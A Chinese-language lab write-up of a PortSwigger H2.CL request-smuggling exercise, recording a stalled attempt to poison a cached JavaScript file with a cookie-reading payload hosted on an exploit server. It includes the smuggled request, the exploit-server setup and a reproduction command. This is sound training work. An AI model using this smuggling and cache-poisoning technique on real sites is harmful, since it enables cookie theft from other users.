---
title: "lab-request-smuggling-h2-cl-request-smuggling"
---

# lab-request-smuggling-h2-cl-request-smuggling

> evidences: [[h2-smuggling-family]]

PortSwigger `request-smuggling/advanced/lab-request-smuggling-h2-cl-request-smuggling`(批 41 新实例
`0a03004504fbc6c380aada9400b600f8`;exploit server `exploit-0adf00ed0467c6d78022d97b010e00a1`)。
目标:让每 10s 开首页的 Carlos 加载并执行 exploit server 上的 JS。

- 判定:**stuck**(H2.CL 原语 + 302 gadget + 载荷落地都成立;**响应错位没能在可判别的请求上复现**)。

## 实测

1. 首页必载 `/resources/js/analyticsFetcher.js`(230B,`Cache-Control: public, max-age=3600`,
   5s 后拉 `analytics.js?uid=<rand>`)⇒ **受害者的 JS 请求 URL 固定且可缓存**。
2. exploit server 已 STORE:`/resources/` = `alert(document.cookie)`;
   `/resources/js/analyticsFetcher.js` = 同载荷 + head `HTTP/1.1 200 OK\nCache-Control: max-age=600`
   (head 只吃两行,Content-Type 由后缀决定)。
3. **H2.CL 帧(h2_burst 双流)**:流1 `POST /` + `content-length: 0` + body = 走私的 h1 请求;
   流2 `GET /resources/js/analyticsFetcher.js`。
   - 走私请求 = 同一 JS 路径 → 流2 得到 app 的 JS(230B)——**与自然响应不可分辨**;
   - 走私请求改成 `GET /resources`(应产出 `302 Location: https://<我方 Host>/resources/`)→ 流2 **仍是 app 的 JS(200)**
     ⇒ **错位没发生**(走私响应没落到流2)。批 35 的"stream3 收到 smuggled 响应"需用可判别路径重测。
4. `http_dump <inst>/resources/js/analyticsFetcher.js` 仍是 app 的 JS(200,无 X-Cache),`solved_check` false。

## 未决面

- 用**可判别**的走私路径(如 404/302)确认错位落在哪条流,再让"承载受害者 JS URL 的那条流"读到队列里的
  exploit server 载荷,并确认前端会把它缓存进 JSON/JS 键(本 lab 的 JS 带 `max-age=3600`,是理想投毒目标)。

## 复现

```
h2_burst <inst>/ --req 'POST /|GET /resources HTTP/1.1\r\nHost: exploit-0adf00ed0467c6d78022d97b010e00a1.exploit-server.net\r\n\r\n|content-length: 0;;content-type: application/x-www-form-urlencoded' --req 'GET /resources/js/analyticsFetcher.js'
http_dump <inst>/resources/js/analyticsFetcher.js
```
